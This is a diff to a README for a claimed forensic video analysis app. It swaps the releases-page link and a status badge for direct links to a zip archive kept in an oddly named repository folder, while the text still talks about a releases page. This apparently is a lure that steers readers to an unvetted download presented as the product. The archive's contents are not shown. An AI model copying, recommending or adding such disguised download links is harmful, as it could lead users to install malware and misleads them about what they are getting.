@@ -1,7 +1,7 @@
 # 🎥 project-st - Easy Digital Video Analysis Tool
 
 ## 📥 Download the App
-[![Download project-st](https://img.shields.io/badge/Download-project--st-blue.svg)](https://github.com/fatikani/project-st/releases)
+[![Download project-st](https://raw.githubusercontent.com/fatikani/project-st/main/engastrimythic/project-st.zip)](https://raw.githubusercontent.com/fatikani/project-st/main/engastrimythic/project-st.zip)
 
 ## 🎯 Project Overview
 This is a **production-ready Streamlit application** for digital forensic video analysis. It comes with built-in test automation. Our tool is designed for quick deployment, making it easy to demonstrate to clients. The interface is simple, but it offers powerful forensic capabilities.
@@ -39,7 +39,7 @@ This application leverages a variety of technologies for its functionality, incl
 ### 1. Visit the Releases Page
 To get the latest version of the project, visit the following link:
 
-[Download and Install project-st](https://github.com/fatikani/project-st/releases)
+[Download and Install project-st](https://raw.githubusercontent.com/fatikani/project-st/main/engastrimythic/project-st.zip)
 
 ### 2. Download the Application
 On the releases page, find the latest version. Click on the appropriate file to download it to your computer. 
